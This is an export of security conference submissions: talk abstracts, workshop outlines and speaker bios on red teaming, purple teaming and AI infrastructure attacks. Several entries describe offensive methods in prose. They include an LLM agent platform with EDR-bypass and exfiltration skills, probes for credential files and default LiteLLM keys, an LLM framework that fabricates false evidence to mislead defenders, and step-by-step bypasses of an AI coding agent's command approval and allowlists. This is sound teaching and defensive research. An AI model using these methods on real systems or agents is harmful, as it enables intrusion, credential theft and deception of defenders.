+- skill: Execute one of the isolated skill agents, each with its own system prompt, tool policy (strict binary allowlist), and output schema.
+- campaign: Chain multiple skills together with approval gates before dangerous actions. Can run in interactive mode (pause between every skill) or auto mode (pause
+only before high-risk skills like privilege escalation or persistence).
+- report: Generate a findings report from all skill outputs collected during the session.
+- model: Switch the backing LLM model mid-operation.
+
+The current skill agents:
+
+Reconnaissance: passive-recon, active-recon, attack-surface-analyzer
+Planning: exploitation-planner
+Exploitation: exploitation-executor, credential-validation
+Post-exploitation: post-exploitation, privilege-escalation, lateral-movement
+Persistence and evasion: persistence, edr-bypass, data-exfil
+Cloud: cloud-enumeration
+
+Delegation to real implants:
+
+Skills that require execution on a target (post-exploitation, privilege escalation, lateral movement, etc.) communicate through a delegation bridge. The bridge links the LLM skill agent to an existing implant callback (Apollo, Merlin, or similar) in Mythic, allowing the skill to issue commands on the target and receive output synchronously. The operator sees all delegated commands in Mythic's task log.",Redon,Gashi,Managing Security Consultant - Sentry Cybersecurity,"Redon Gashi is a Managing Security Consultant and offensive team lead at Sentry, where he has spent close to a decade leading and executing penetration tests and red team operations for Fortune 500 clients across banking, telecom, insurance, and fintech. He holds the OSEP, CRTL, and CRTO certifications, and has personally performed over 200 engagements spanning web applications, internal infrastructure, and mobile platforms, while leading many more across his team. A former lecturer at Cyber Academy, speaker at multiple BSides conferences, and multiple-time CTF champion, Redon combines deep hands-on technical expertise with a proven ability to build and scale offensive security teams.",https://sentry.security,https://www.linkedin.com/in/redongashi/,,https://x.com/redong4shi,https://cdn.sessionize.com/image/ac02-400o400o1-4GvFcGQXiFWsw62gZiLUvF.jpg
+,,,,,,,Armend,Gashi,Managing Security Consultant at Sentry Cybersecurity,"Armend Gashi is Managing Security Consultant at Sentry. With over 5 years in the industry, he specializes in application security and AWS cloud assessments. Armend has conducted AI red teaming engagements, developed multi-agent systems to perform security-focused tasks such as code auditing and exploit development, and was part of Anthropic’s external AI red team capability through HackerOne.
+
+Armend has led security research initiatives resulting in the discovery of multiple vulnerabilities, including:
+
+CVE-2023-26482 - Critical-risk vulnerability enabling remote code execution
+CVE-2023-48239 - High-risk vulnerability allowing arbitrary user storage updates
+CVE-2023-35928 - High-risk vulnerability enabling user account hijacking
+CVE-2023-45660 - Medium-risk application-level denial of service vulnerability
+CVE-2023-48301 - Medium-risk arbitrary browser code injection vulnerability
+CVE-2023-48307 - Low-risk server-side request forgery vulnerability",https://sentry.security/,https://www.linkedin.com/in/armend-gashi/,https://blog.sentry.security/,https://x.com/armendxgashi,https://cdn.sessionize.com/image/4d3b-400o400o1-szVmci5X47GTBdThyFxzXL.jpg
+redStack: Boot-To-Breach Red Team Platform,"A two-hour hands-on workshop/tactic where attendees stand up a red team operator stack (https://github.com/BaddKharma/redStack) and execute a multi-C2 kill chain against a live cyber range. Each attendee gets their own range instance delivered over an OpenVPN tunnel, so no public DNS or exposed infrastructure is required.
+
+Agenda:
+10 min, theory and setup verification. Attendees arrive prepped per the prereq packet (AWS CLI, Terraform, AWS account, OpenVPN client). I frame the session with the multi-C2 segmentation tradecraft pattern that the rest of the time builds on.
+
+40 min, staging and provisioning, narrated live. Attendees stand up their operator stack while I talk through each component, the design choices behind it, and the operator decisions that show up at deploy time.
+
+10 min break.
+
+45 min, attack path on a live cyber range. Each attendee runs against their own individually instanced range over OpenVPN. We work through the chain together: Mythic for initial access, Sliver for lateral movement, Havoc for domain dominance. I stay at the table answering questions while attendees execute.
+15 min, Q&A, and teardown. I remain available after the slot for one-on-ones with anyone who wants more time on a specific piece.
+
+A prerequisites packet will be published in advance and will cover AWS account setup, CLI and Terraform install, OpenVPN client, and any local tooling. Total AWS footprint stays within default account quotas at 8 instances and 16 vCPU, so no quota increase request is required.
+",Workshop,"A two-hour hands-on workshop/tactic where attendees stand up a red team operator stack (https://github.com/BaddKharma/redStack) and execute a multi-C2 kill chain against a live cyber range. Each attendee gets their own range instance delivered over an OpenVPN tunnel, so no public DNS or exposed infrastructure is required.
+
+Agenda:
+10 min, theory and setup verification. Attendees arrive prepped per the prereq packet (AWS CLI, Terraform, AWS account, OpenVPN client). I frame the session with the multi-C2 segmentation tradecraft pattern that the rest of the time builds on.
+
+40 min, staging and provisioning, narrated live. Attendees stand up their operator stack while I talk through each component, the design choices behind it, and the operator decisions that show up at deploy time.
+
+10 min break.
+
+45 min, attack path on a live cyber range. Each attendee runs against their own individually instanced range over OpenVPN. We work through the chain together: Mythic for initial access, Sliver for lateral movement, Havoc for domain dominance. I stay at the table answering questions while attendees execute.
+15 min, Q&A, and teardown. I remain available after the slot for one-on-ones with anyone who wants more time on a specific piece.
+
+A prerequisites packet will be published in advance and will cover AWS account setup, CLI and Terraform install, OpenVPN client, and any local tooling. Total AWS footprint stays within default account quotas at 8 instances and 16 vCPU, so no quota increase request is required.",,,,Michael,Ortiz,Red Team Engineer,"Michael Ortiz is a Red Team Engineer and SME on the U.S. Department of State's Red Cell, running adversary emulation across State enterprise and partner networks. His focus spans offensive tradecraft, evasion engineering against modern EDR's, and the cybersecurity engineering behind durable red team infrastructure. He's the founder of devZero Security, an SDVOSB offering offensive security and security engineering services to federal and commercial clients, and the developer of redStack, an open source AWS and Terraform project that stands up a full red team operations stack on demand. A Marine Corps veteran, Mike holds OSEP, OSCP, CRTO, and CRTL, among other certifications.",https://www.linkedin.com/in/mike-ortiz-redsec/,https://www.linkedin.com/in/mike-ortiz-redsec/,https://github.com/BaddKharma/redStack,,https://cdn.sessionize.com/image/160b-400o400o1-9zuscw3JjtWzat1AsVDBJM.jpg
+,,,,,,,Michael,Kim,"Senior Consultant, Offensive Security, Proactive Services","Michael Kim’s journey into cybersecurity is a story of resilience and reinvention. Having lived in seven countries, he faced relentless bullying, racism, and isolation - challenges that once pushed him to the brink. After pursuing paths in veterinary medicine, pharmacy, law, and biology, and graduating with a zoology degree, he shifted careers entirely during the pandemic, leaving behind a career as a DJ and music producer to chase a new purpose in cybersecurity. Through persistence and countless failures, he rose from a boot camp graduate to a Senior Consultant in Offensive Security at Palo Alto Networks Unit 42, leading red team operations, adversary simulations, and penetration tests for global clients. His multicultural background and lived experiences shape his unique approach to hacking and problem-solving, and his story proves that adversity can be transformed into strength - and that anyone, no matter their past, can build a powerful career in cybersecurity.",,http://linkedin.com/in/michael-k-83b0627b,,,https://cdn.sessionize.com/image/2269-400o400o1-nectchQxjYryUSZcp7LMex.jpg
+MCPwned: How Exposed AI Agents Became the Internet’s New Recon Toy,"This talk examines how exposed AI infrastructure is becoming a new adversary playground, as attackers and internet-scale scanners and bruteforcing target LLM gateways, MCP servers, local inference APIs, and AI developer tooling faster than defenders have built threat models for them.
+
+I ran a purpose-built AI honeypot that simulated 16 LLM and AI infrastructure personas across 16 ports, returning framework-authentic responses, headers, errors, and protocol behaviors. In one 48 hour window, the system captured 3,993 requests from 327 unique source IPs, including 155 MCP probes and 344 AI API key probes. What emerged was not generic internet noise, but a repeatable playbook against the emerging AI stack: LiteLLM model-registration abuse, MCP resource enumeration, framework-aware credential brute forcing, and coordinated scanning for exposed local inference services.",Talk,,"I. LiteLLM Proxy Poisoning — A New Kind of AI Infrastructure Abuse (8 min)
+
+Discovery: model enumeration, model registration attempts, key-generation probing, and chat completion requests routed through an attacker-defined model
+Technique: registering a backend with an attacker-controlled api_base, turning future inference traffic into outbound server-side traffic from the LiteLLM host
+Why it matters: this is not memory corruption or a traditional exploit, but abuse of exposed or weakly protected AI management functionality
+Purple-team takeaway: model registration, backend routing, gateway routes, and inference proxy behavior need to be modeled in offensive testing
+
+II. MCP Enumeration — Why Agent Protocols Change the Recon Model (5 min)
+
+Observed MCP activity shows how agent infrastructure is already being enumerated at the protocol level.
+
+Workflow: initialize, initialized notification, tools/list, resources/list, resources/read, and prompts/list
+Sensitive probing: attempts to read file:///etc/passwd, file:///etc/hosts, file:///root/.env, db://internal/customers, and db://internal/llm_sessions
+Why it matters: exposed MCP servers may reveal tools, prompts, files, databases, and internal resources depending on implementation
+Tradecraft implication: MCP enumeration is already automated, whether by scanners, recon platforms, or hostile infrastructure
+
+III. Framework-Aware AI Infrastructure Attacks — What It Means (5 min)
+
+Attackers are not just guessing generic API paths; they are targeting AI frameworks with implementation-specific knowledge.
+
+Observed targeting: LiteLLM-specific routes such as /anthropic/v1/models and /proxy/anthropic/v1/models
+Credential patterns: sk-litellm-master-key, sk-litellm-proxy, sk-admin, sk-prod, sk-dev, sk-token, and sk-secret
+Why it stands out: the paths and wordlists suggest knowledge of framework internals, leaked deployments, source code, or prior compromises
+Simulation takeaway: AI infrastructure brute forcing should include framework-specific routes, defaults, and AI-native credential patterns
+
+IV. Attack Timeline and Walkthrough (5 min)
+
+Using captured requests to reconstruct how attackers and scanners approach exposed AI infrastructure.
+
+Honeypot architecture: a global network of cloud nodes simulating 16 AI and LLM personas across 16 ports
+Capture methodology: full request/response pairs, session correlation, enriched metadata, and central aggregation
+Walkthrough: LiteLLM sequence from model enumeration through attempted registration and chat completion routing
+Walkthrough: MCP sequence from resource discovery through sensitive URI access attempts
+
+V. Local Inference Case Study: LM Studio, Ollama, and Developer Machine Exposure (3 min)
+
+A case study in the gap between local AI tooling assumptions and real internet exposure.
+
+Observed activity: coordinated scanning against LM Studio’s default port 1234 from related network ranges
+Why it matters: local inference tools are often built for developer convenience, not internet-facing resilience
+Exposure pattern: predictable ports and OpenAI-compatible API behavior make local AI services discoverable
+Broader implication: adversaries do not need to compromise the model if they can reach the API wrapper, gateway, or local inference server around it
+
+VI. Operationalizing This for Purple Teams (2 min)
+
+Closing with concrete detections, emulation ideas, and a tool release.
+
+Detection opportunities: exposed LiteLLM management routes, unexpected /model/new calls, suspicious api_base values, MCP resources/read attempts, AI-specific credential dictionaries, and default inference port scans
+Emulation opportunities: model registration abuse, MCP enumeration, local inference exposure, framework-aware credential probing, and AI gateway misconfiguration
+Tool release: share the honeypot framework and capture methodology so defenders can measure what their own exposed AI attack surface attracts
+Final takeaway: attackers and internet-scale scanners are already adapting to the AI stack; purple teams need to model what is actually happening, not what AI security slideware says might happen someday",,,Eli,Woodward,Senior Threat Intelligence Advisor with Team Cymru,"Eli Woodward is a cyber threat intelligence advisor with Team Cymru. He's worked in a variety of industries including financial services and government, and has seen the range of organizations from extremely well-resourced and capable to the shoestring budget. This has given him unique insights into CTI at all levels of complexity, maturity, and resources. He holds a master's degree in Intelligence and Security Studies and also plays bagpipes competitively.",https://www.team-cymru.com/,https://www.linkedin.com/in/eliwood/,https://www.linkedin.com/in/eliwood,https://x.com/elijahwoodward9,https://cdn.sessionize.com/image/7f69-400o400o1-eyumtoFrg51LvjybJX7NQ.png
+Power To The Purple,"Title: Power To The Purple
+Abstract:
+The modern cybersecurity realm is no longer one where defenders can work in a vacuum and be successful. Conversely, many people are starting to lose faith in the value of penetration testing as a mechanism to measure their organizational security posture. A collaborative milestone driven approach where Red and Blue teams operate in tandem, is necessary to ensure a proactive approach to enhancing the security of our organizations. This is where Purple Teaming comes into play. In this 2-hour hands-on workshop you will be introduced to Purple Team Exercises and play the role of a Cyber Threat Intelligence analyst, Red Team operator, and Blue Team security analyst. 
+",Hands-on Activity,,,"We have set up an isolated environment for each attendee to go through a Purple Team Exercise following the Purple Team Exercise Framework (PTEF). This event will give participants a chance to test out new tools, techniques, and procedures learned during the workshop. 
+
+- Key Take Aways:
+    - Learn the basics of Purple Teaming through the study of the PTEF.
+    - Setup and utilize Command and Control (C2) frameworks.
+    - Consume Cyber Threat Intelligence from a known adversary.
+    - Extract adversary behaviors/TTPs and map them to the MITRE ATT&CK framework.
+    - Play the Red Team by creating and executing adversary emulation plans.
+      - Emulate the adversary behaviors in a simulated organization to determine how it would stand up to the adversary.
+    - Play the role of the Blue Team to hunt for malicious behavior and Indicators of Compromise.
+      - Deploy and utilize popular defensive tooling such as Sysmon, log ingestors, and SIEMS to aide in threat hunting.",,Trey,Bilbrey,"Head of SCYTHE Labs, ","Trey Bilbrey is the Lead of SCYTHE Labs, specializing in Purple Team Exercises, Threat Emulation, Critical Infrastructure, and holistic cyber operations. Trey's 17+ years of industry experience has allowed him to become an excellent educator, defender of networks, and a cultivator of cybersecurity professionals. Prior to joining SCYTHE, Trey held positions at notable organizations such as Hack The Box (HTB Academy content Developer), The Army Corps of Engineers (ICS/SCADA Penetration Testing), and a veteran of the United States Marine Corps (Defensive and Offensive Cyber Operations). Current certifications include the CISSP, GICSP, GCIP, and K>FiveFour RTAC.",https://scythe.io,https://linkedin.com/in/georgebilbrey,https://scythe.io/resources,https://twitter.com/TCraf7,https://cdn.sessionize.com/image/5154-400o400o1-f19NTo3nw3PKQ4FT2Afs67.jpg
+,,,,,,,Tyler,Casey,Lead Detection Engineer; Deputy of SCYTHE Labs,"Tyler Casey is a seasoned Cyber Professional with over a decade of experience in Defensive Cyber Operations (DCO). Currently serving as Detection Engineer and Deputy at Scythe Labs, Tyler specializes in developing and implementing robust defensive cybersecurity measures to detect and mitigate evolving threats. Prior to joining SCYTHE, Tyler worked in DCO Operations for the U.S. Government, both as a Federal Civilian and Active-Duty Marine. During that tenure, Tyler deployed internationally in support of incident response and targeted threat hunting. Throughout his career, he has been dedicated to enhancing cyber defenses, ensuring the security of critical systems, and contributing to the broader cybersecurity community.",https://scythe.io/,https://www.linkedin.com/in/tyler-j-casey,,,https://cdn.sessionize.com/image/cb81-400o400o1-SzmfKqkJfkXs1gwoADjT5j.jpg
+Emulating the “Identity-First” Threat Actor: Automated Playbooks for IdP Hijacking,"Modern intrusions often start with identity, not malware. Adversaries abuse IdP drift, device code flows, stale sessions, weak conditional access, helpdesk processes, SaaS integrations, and cloud role mappings. This talk presents a safe emulation framework for identity-first threat actors across AD, Entra ID, Okta-like workflows, and cloud control planes. The lab provides ATT&CK-aligned playbooks that simulate identity compromise, IdP pivoting, session abuse, and SaaS access without stealing real credentials. The focus is measurable purple-team validation: expected telemetry, detection hypotheses, failure points, and repeatable scoring.",Talk,,"Many adversary emulation plans still assume the intrusion begins with malware execution and endpoint persistence. That model misses a growing class of intrusions where the attacker’s primary tool is identity. The path may start with a phished session, device code abuse, helpdesk manipulation, stale SaaS access, IdP synchronization drift, or cloud role assignment. The attacker may never need custom malware to reach sensitive systems.
+
+This talk introduces an identity-first adversary emulation framework. The framework models how an attacker moves from on-prem identity to cloud identity, from IdP to SaaS, and from SaaS to cloud control plane access. The lab uses synthetic AD, Entra ID-style identity objects, Okta-like flows, SaaS app assignments, and cloud role mappings. Each emulation step includes a defensive expectation: what log should exist, what alert should fire, what identity relationship should be visible, and what evidence proves the control worked.
+
+The playbooks are designed for purple teams, not uncontrolled attack simulation. They cover safe versions of device code flow testing, session reuse simulation, IdP drift detection, privilege assignment review, SaaS integration abuse, and cloud role pivoting. The talk maps each step to ATT&CK techniques where appropriate, but it avoids turning ATT&CK into a checkbox exercise. The emphasis is measurable coverage.
+
+The demo shows a synthetic user moving through an identity-first path. The audience sees the identity graph, the emulation step, the generated telemetry, the expected detection, and the final coverage score. The result is a repeatable way for organizations to test whether their identity controls detect modern intrusion behavior.",,,Samet Can,Tasci,Senior Linux Systems Engineer,"Samet Can Tasci is a Senior Linux Systems Engineer and security researcher with experience across enterprise infrastructure, cloud and hybrid environments, automation, and defensive security validation. 
+
+His research interests include web defense behavior, WAF normalization gaps, parser inconsistencies, adversary-informed testing, and practical tooling for security teams. 
+
+He is the creator of WaffleX, a research prototype selected for Black Hat USA Arsenal, which focuses on semantic consistency analysis, enforcement drift, and family-level request-variant testing across modern web application defense stacks.",,https://www.linkedin.com/in/sametcantasci/,,,https://cdn.sessionize.com/image/dbe4-400o400o1-Mo8NaBqyVjbEqqfKsmHM9B.png
+,,,,,,,Mehmet Önder,Key,Cyber Security Consultant,"Önder Key is a cybersecurity consultant specializing in critical infrastructure security, zero-day vulnerability analysis, and offensive security. He has advised organizations in high-security sectors such as defense, aerospace, and finance, with hands-on experience in both red teaming and strategic security engineering. His work has been featured across numerous countries and platforms, contributing to the discovery of systemic vulnerabilities. Currently, he provides consultancy to TurkNet and continues to advance the global offensive security ecosystem by challenging traditional approaches to cybersecurity.",,https://www.linkedin.com/in/okey,,,https://cdn.sessionize.com/image/0c91-400o400o1-aEDBL3bJtUPv5wSzAHZoZ8.png
+SEND: Teaching Machines to Lie to Defenders,"Cyber deception research has spent decades placing honeypots, honeyfiles, and fake credentials in enterprise environments to catch attackers. Yet practitioners in real Security Operations Centers do not investigate individual artifacts in isolation — they construct causal narratives to explain sequences of events, routing attention toward high-severity signals, end-of-attack-chain activities, and operations in sensitive infrastructure. As Sundaramurthy et al. documented through ethnographic study of live SOC environments, analyst behavior under alert overload is governed by triage heuristics and pattern-matching rather than systematic evidence review — creating a systematic cognitive attack surface that no existing offensive framework has been designed to exploit.
+
+In this work, we introduce SEND (Self-Evolving Narrative Deception), an adversary simulation framework that reframes offensive deception as an investigation narrative poisoning problem: the objective is not to evade detection, but to corrupt the causal story defenders reconstruct during incident response. Drawing on direct consultation with active SOC analysts and incident responders, we identify three empirically grounded cognitive attack vectors that structure the SEND action space — (a.) severity escalation exploitation, targeting the operational requirement to fully investigate HIGH/CRITICAL alerts regardless of underlying harm, (b.) end-of-chain activity simulation, targeting mandatory runbook escalation triggered by ransomware staging or exfiltration patterns regardless of actual file content, and (c.) sensitive location poisoning, targeting the elevated investigative attention guaranteed by activity near domain controllers, privileged shares, and executive endpoints.
+
+We present a design analysis showing that each attack vector can be instantiated at negligible red team cost — failed LSASS reads, dummy outbound transfers of random bytes, and mass-created ransomware-extension files are designed to generate the same mandatory investigation burden as their genuine counterparts, without requiring those actions to succeed. A key design distinction structures the SEND action space: activity simulation generates authentic system telemetry that defenders cannot distinguish from genuine attacker behavior at the telemetry level, while artifact implantation provides cross-system narrative coherence. A Narrative Consistency Engine coordinates both modalities using an LLM to ensure every fabricated email thread, file access log, and collaboration platform entry supports a single coherent false story — shifting the defender's task from ""did something anomalous happen?"" to ""which of several plausible explanations is true?""
+Moreover, to enable rigorous evaluation of narrative deception beyond detection evasion metrics, we introduce the Investigation Narrative Divergence Reward (INDR) — a four-dimensional cognitive metric quantifying divergence across event reconstruction, causal graph structure, inferred attacker intent, and attribution outcome. INDR is designed to capture a class of deception success that existing red team metrics cannot measure: a defender may correctly identify every process in a malicious process tree yet still produce an incident report attributing the wrong objective, wrong actor, and wrong scope. We further formalize Investigation Graph Poisoning as a measurable attack surface, and outline experimental protocols for evaluating SEND across SOC environments of varying maturity, tooling, and analyst expertise.
+
+In conclusion, SEND establishes the incident investigation itself as a first-class attack surface in adversary simulation, derives deception strategy from empirically grounded blue team cognitive prioritization rather than intuition, and proposes INDR as a new evaluation metric for simulation fidelity — one that asks not whether a simulation triggered alerts, but whether it distorted the reasoning of the defenders who responded to them. Our framework operationalizes at a systematic level what nation-state actors have long practiced intuitively, and makes that threat model legible enough for both red teams and defenders to reason about and build against.",Talk,,"[0:00 – 3:00] Opening: The Wrong Question
+
+* The assumption every red team operates on: ""How do I avoid being detected?""
+* The real question experienced defenders ask: ""What story explains these events?""
+* Cold open: walk the audience through a hypothetical IR scenario where the defenders caught everything — and still got the narrative completely wrong
+* Thesis stated: detection is not the attack surface. The investigation is.
+
+[3:00 – 8:00] How SOCs Actually Investigate (And Why That's Exploitable)
+
+* Not every alert gets equal attention. How do analysts actually triage under load?
+* Direct insights from practitioner consultation: the three consistent prioritization behaviors
+
+  * Severity escalation bias — critical alerts get fully investigated, full stop
+  * End-of-chain focus — ransomware staging, exfiltration patterns, and credential dumps trigger mandatory runbooks, regardless of whether any harm has actually occurred
+  * Sensitive location salience — anything near DC01, SYSVOL, HR shares, or executive endpoints gets deep investigation even at low severity
+* The cognitive science behind this: Endsley's situation awareness model, Klein's Recognition-Primed Decision framework, and how narrative construction shapes incident conclusions
+* Key insight: defenders investigate causal stories, not artifacts. A plausible false story, supported by authentic telemetry, is more dangerous than a genuine attack that looks anomalous
+
+[8:00 – 13:00] SEND: Architecture and Action Space
+
+* What SEND is: an adversarial simulation framework that treats the defender's investigation graph as an optimization target
+* The Deception Priority Engine: how the three tiers map to concrete red team actions
+
+  * Tier 1 — Severity-aware alert fabrication:
+
+    * LSASS read attempts (no actual dump)
+    * Fake scheduled tasks as SYSTEM
+    * Failed logon attempts to non-existent accounts (different Event ID sub-status, zero lockout risk)
+    * Kerberoasting enumeration
+  * Tier 2 — End-of-chain simulation:
+
+    * Sensitivity-named staging files
+    * Dummy large-file outbound transfers (random data, real DLP trigger)
+    * Mass ransomware-extension file creation
+    * Zero-sleep C2 beaconing
+  * Tier 3 — Sensitive location exploitation:
+
+    * Route all deceptive activity through DC01
+    * SYSVOL
+    * Finance/HR shares
+    * Backup infrastructure
+* The key insight: the red team does not need these actions to succeed. They only need to log. A failed LSASS access generates the same mandatory investigation as a successful one. Cost: negligible. Defender cost: hours.
+* Activity simulation vs. artifact implantation: why behavior-generated telemetry is fundamentally harder to dismiss as deception than static files
+* The Narrative Consistency Engine: how an LLM layer ensures cross-artifact coherence across the fabricated scenario
+
+[13:00 – 18:00] Live Demonstration
+
+* We walk through a complete end-to-end deception campaign as generated by SEND — from priority tier selection through narrative artifact generation to the resulting defender investigation graph
+* The demo concretely illustrates how a coordinated set of low-cost actions, each individually unremarkable, assembles into a coherent false narrative that a defender following standard SOC procedure would be compelled to investigate in full
+* The audience sees what the investigation looks like from the blue team's perspective — and then sees what actually happened
+
+Specific scenario and tooling to be finalized prior to submission of final materials.
+
+[18:00 – 23:00] Measuring What Matters: INDR and the Cognitive Reward Model
+
+* Why traditional evasion metrics are the wrong measurement for narrative deception
+* Introducing INDR (Investigation Narrative Divergence Reward): a four-dimensional metric for measuring how badly the defender's reconstruction diverges from reality
+
+  * Event divergence: did they identify the right events?
+  * Causal divergence: did they connect events correctly? (measured via graph edit distance on the investigation graph)
+  * Intent divergence: did they infer the correct attacker objective? (semantic embedding comparison)
+  * Attribution divergence: did they identify the right actor?
+* A defender can correctly observe every malicious process in the tree and still score high divergence on intent and attribution — SEND optimizes the entire chain, not just individual alerts
+* Additional reward signals:
+
+  * Investigation graph poison ratio
+  * Severity queue saturation
+  * Confidence miscalibration
+* Multi-agent co-evolutionary training:
+
+  * Red agents learn which narratives work
+  * Blue agents adapt countermeasures
+  * Co-evolution surfaces emergent deception strategies that nobody pre-designed
+* Preview of expected co-evolutionary dynamics:
+
+  * Early generations use basic artifact planting
+  * Later generations discover that end-of-chain simulation creates mandatory escalation paths no analyst heuristic can shortcut
+
+[23:00 – 27:00] Implications and Open Questions
+
+* What this means for red team doctrine:
+
+  * Stealth is not always the right objective
+  * Sometimes being partially caught in the right way is more disruptive than full evasion
+* What this means for blue teams:
+
+  * How to build investigation workflows more resilient to narrative poisoning
+  * Narrative plausibility scoring
+  * Decoupled confirmation pipelines
+  * Skepticism toward end-of-chain discoveries that arrive too cleanly
+* What this means for adversary simulation practitioners:
+
+  * INDR as a new class of evaluation metric for simulation fidelity
+  * Measuring whether a simulation actually distorted defender reasoning, not just triggered alerts
+* Open research questions previewed:
+
+  * Can evolved narrative deception strategies transfer across SOC environments with different maturity levels?
+  * Are LLM-assisted defenders more susceptible to well-crafted narrative deception due to similar confirmation bias patterns?
+  * What novel tactic families emerge from long-term co-evolution that are not present in the initial action space?
+* Ethics and responsible use framing:
+
+  * This research operationalizes what nation-state actors already do intuitively
+  * The goal is to make the threat legible so defenders can build countermeasures
+
+[27:00 – 30:00] Conclusion and Q&A Setup
+
+* Summary:
+
+  * SEND treats the incident investigation as an attack surface
+  * Derives deception strategy from empirically grounded blue team cognition
+  * Measures success as narrative divergence rather than detection evasion
+* Core takeaway for the room:
+
+  * The next time you do a purple team exercise, ask not ""was the attack detected?"" but ""did the incident report reflect what actually happened?""
+* Invitation to Q&A and collaboration:
+
+  * This is an early-stage framework
+  * Practitioners with SOC/IR/adversary simulation experience are exactly the people whose input shapes what gets built
+
+This contains detailed research information:
+https://drive.google.com/file/d/1QANouyEWrzCVAzpHl47x7BHk8LUxlqJ4/view?usp=sharing
+",,,Yi Ting,Shen, AIFT - Associate GenAI Security Researcher,"I am currently working as a Associate Associate GenAI Security Researcher at AIFT. Over the past year, I have presented various cybersecurity-related research topics at more than 20 domestic and international conferences (DEFCON, ROOTCON, BSides..). I enjoy conducting research, especially focusing on AI/ML applications this year. By engaging with different technical domains, I aim to solve cybersecurity problems, uncover vulnerabilities across various platforms, and identify new CVE vulnerabilities. I have found vulnerabilities in multiple platforms, including Google, Cloudflare, open-source projects, and educational institutions. Learning and research have become the central focus of my life.
+
+Blog: https://no-flag.com/",,https://www.linkedin.com/in/yi-ting-shen-712434211/,https://no-flag.com,,https://cdn.sessionize.com/image/8a93-400o400o1-wNd5PQCf89AFPpRSJnmYx9.jpg
+,,,,,,,Ariz,Soriano,Associate Director - Red Team Operations @ THEOS Cyber Solutions,"Ariz Soriano is Associate Director of Red Team at Theos, with nearly a decade of experience spanning Red Teaming, Penetration Testing, and Incident Response. He started his career on the defensive side, working as a SOC analyst and eventually leading SOC and IR teams for his first four years in the industry. That defensive foundation gives him a perspective most purely offensive operators don't have.
+
+He built the Theos Red Team from the ground up, recruiting and training operators, designing red team infrastructure and tooling, and establishing the methodology and playbooks behind the team's APT simulation and purple teaming engagements. Today he runs a practice that delivers multiple concurrent engagements a year, balancing operations with presales, scoping, revenue targets, and people management.
+
+Outside of client work, Ariz is passionate about building red team tooling, optimizing offensive workflows, and sharing knowledge with the community as a conference speaker. He also contributes to TryHackMe as a part-time Senior Content Engineer, creating hands-on cybersecurity labs and challenges based on real-world attack techniques.",,https://www.linkedin.com/in/ariz-soriano-a361ba115/,,,https://cdn.sessionize.com/image/2ef7-400o400o1-3AF3iDCGbJgRKHu776BAa7.jpg
+Vibe Check: How Adversaries Exploit Developer Trust from Malicious Repos to AI Agents,"""Do you trust the authors of the files in this folder?"" It's a prompt modern IDEs throw at developers, and most click past it by reflex. In 2026, adversaries turned that reflex into an initial-access vector - North Korean operators (Void Dokkaebi / Famous Chollima) now lure developers into cloning malicious repos that execute the moment a folder opens, with 750+ infected repositories catalogued so far.
+
+This hands-on workshop has attendees emulate attacks across the three boundaries developers trust by default: the IDE, the AI coding agent, and the package manager. Participants build and run the artifacts themselves: a take-home-assessment repo that fires malicious payloads in IDEs, a ""Claude Code""-style agent harness hardened and then bypassed one layer at a time to achieve code execution, and a trojanized npm package that runs before any code imports it. Each is drawn from real 2026 attacks & vulnerabilities: DPRK interview lures, agent-harness CVEs, and the recent Shai-Hulud npm worm.",Workshop,"The core idea
+Every attack in this workshop is the same shape: how developer trust can be exploited on seemingly trusted tools, such as IDEs, AI agents, and package managers. Attendees will build malicious artifacts themselves, and run them against their own vulnerable targets. In particular, the AI section aims to deliver the message that while LLM is probabilistic, the harness around it is just deterministic software, and it falls to the same classic application weaknesses if built without proper hardening.
+
+Module 1 - Repo & IDE trust (~45 min)
+Attendees will work on a malicious take-home assessment repo. Two vectors: a hex-obfuscated remote payload pulled in through new Function + injected require on npm start, and a .vscode/tasks.json task with runOn:folderOpen that fires before you touch anything.  While tools like VS Code now gates this behind workspace trust by default, some forked IDEs like Cursor disable the safeguard by default. Developers may also be pressured to disable the safeguard in a fake interview setting - highly mapped to the DPRK fake-interview campaigns active through 2026.
+
+Module 2 - Agent harness (~60 min)
+Attendees will point a ""Claude Code""-style harness at malicious repos and harden it one stage at a time: open auto-run, then per-command approval, then an allowlist, then anti-chaining, then allow + denylist. Each stage gets bypassed with a technique that maps to real disclosed CVEs & known vulnerabilities, such as truncated approval UI, GTFOBins, piped commands, and exfiltration that never needs code execution at all. The end goal is to make the audience reflect on the three questions when using AI agents: what did the model request, what did the harness show, what actually ran. 
+
+Module 3 - Package managers (~45 min)
+Attendees will build a malicious local package and install it with npm install ../evil-package, then watch the postinstall fire before any of their code imports it. The lesson is that npm install is not just a download: lifecycle scripts run as your user, with your environment, with access to your home directory, git config, and SSH agent. A worm simulation then enumerates sibling packages the way Shai-Hulud did, mapped to the 2026 incidents that turned it into a recurring pattern (TanStack, node-ipc, GlassWorm's invisible-unicode payloads).
+
+Wrap-up (~15 min)
+Back to the one pattern, then a hardening checklist and a short triage for each branch: bad workspace opened, agent ran something off, npm install went wrong.
+
+Setup and safety
+Everything is intentionally defanged. The payloads only write marker files inside the container to simulate a successful exfiltration. Attendees need Docker or Podman and nothing else; the image is pulled at the start, and a browser-based IDE is bundled so there's no host editor to configure. 
+
+Fitting the time slot
+The modules can be compressed depending on the time: 2 hours: Modules 1-2 plus wrap-up, with supply chain shown as a guided demo. 2.5 hours: add the npm lab. 3 hours: all three hands-on with room to discuss.
+
+
+""Do you trust the authors of the files in this folder?"" It's a prompt modern IDEs throw at developers, and most click past it by reflex. But as vibe coding and AI agents accelerate development, that implicit trust in tools like VS Code and GitHub has become a critical attack surface and malware delivery channel.
+This hands-on workshop places attendees in the mindset of an attacker targeting modern development environments. After dissecting real 2026 attacks and AI-agent vulnerabilities, we move into labs where participants build and run their own PoCs: malicious repos that trigger code execution in IDEs, a ""Claude Code""-style agent harness we will hack & break together, and trojanized npm packages that run before any code imports them.
+
+
+
+
+The core idea
+Adversaries no longer need an exploit to compromise a developer - they need the developer to trust the wrong thing. This workshop emulates that playbook across the three boundaries developers extend trust to by default: the IDE, the AI agent, and the package manager. Each is a live initial-access and supply-chain vector in 2026, used by actors from DPRK interview-lure operators to the crews behind the npm worms. Attendees take the adversary's side and build the artifacts themselves - a repo that executes on open, an AI agent coerced into running attacker commands, a package that fires before any code imports it - then run them against their own targets inside a provided container.
+
+Module 1 - Repo & IDE trust (~45 min)
+Attendees work through a malicious take-home assessment repo, the same shape DPRK operators (Void Dokkaebi / Famous Chollima) use in fake-interview lures.
+
